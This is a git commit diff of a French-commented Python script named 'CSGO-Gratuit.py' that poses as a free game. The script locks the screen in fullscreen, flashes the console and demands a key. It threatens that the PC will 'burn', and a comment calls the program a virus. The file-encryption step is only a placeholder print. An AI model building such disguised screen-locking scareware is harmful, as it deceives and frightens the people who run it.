dc78be3d41e5d3205c6d5df3f06e270a91c2543b
Enz0lanterne <79151100+Enz0lanterne@users.noreply.github.com>
2021-09-14 17:34:29 +0200

    Quit Program bug (v 1.0.4)

--- CSGO-Gratuit.py
+++ CSGO-Gratuit.py
@@ -2,6 +2,7 @@ from colored import fg, attr, bg
 import os, time, pyautogui, threading, keyboard
 
 # Var
+running = True
 response = "azerty"
 wait_until_block = 0
 
@@ -13,12 +14,18 @@ pyautogui.press("F11")
 
 # Fonction pour bloquer la fenêtre en plein écran
 def WaitF11():
-    while True:
-        keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
-        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam)    
 
-def BackgroundColor():
-    while True:
+    global is_waiting
+    
+    while running:
+        keyboard.wait("F11") # Attendre que la personne appuie sur F11 (ça fonctionne comme un time.sleep mais avec une condition à la place d'un temps d'attente)
+        pyautogui.press("F11") # Lorsque elle appuie alors on réappuie sur la touche (avec pyautogui prcq quand on le fait avec keyboard ça spam) 
+        
+
+def SetBackgroundColor():
+    global running
+    
+    while running:
         os.system("color 40")
         time.sleep(0.1)
 
@@ -26,17 +33,17 @@ def BackgroundColor():
 def Main():
     
     global wait_until_block # Rendre la variable globale (pour pouvoir la modifier depuis la fonction)
+    global running
     
-    while True: 
+    while running: 
         os.system("cls")
         
         user_response = input(f"{fg(0)}{bg(1)}Entrez votre clé ici: \n{attr(0)}") # L'utilisateur entre la clé
 
         if user_response == response: # Si la valeur entrée est correcte
             print(f"{fg(2)}{bg(1)}Clé valide{attr(0)}")
-            print(f"{fg(0)}{bg(1)}Appuyez sur une touche pour quitter{attr(0)}")
-            os.system("pause >nul")
-            os.system("taskkill /f /im CSGO-Gratuit.exe") # ATTENTION au nom du virus
+            print(f"{fg(0)}{bg(1)}Appuyez sur F11 pour quitter.{attr(0)}")
+            running = False # Quitter le programme
 
         else: # Clé invalide
             print(f"{fg(88)}{bg(1)}Clé invalide{attr(0)}")
@@ -47,20 +54,21 @@ def Main():
                 print("tu as utilisé tes trois essais, ton pc est dans la sauce")
                 time.sleep(0.5)
                 break
+    
+    if running: # Si running est sur True
+        # Partie de cryptage (hors de la boucle)
+        print("Ton pc va brûler")
+        time.sleep(0.5)
+        print("insérer le cryptage de fichier: ")
 
-
-    print("Ton pc va brûler")
-    time.sleep(0.5)
-    print("insérer le cryptage de fichier: ")
-                
 
 # Threads
 main = threading.Thread(target=Main)
 wait_f11 = threading.Thread(target=WaitF11)
-background_color = threading.Thread(target=BackgroundColor)
+set_background_color = threading.Thread(target=SetBackgroundColor)
 
 # Liste des threads
-threads = [main, wait_f11, background_color]
+threads = [set_background_color, main, wait_f11]
 
 # Lancer les threads un par un
 for thread in threads: thread.start()
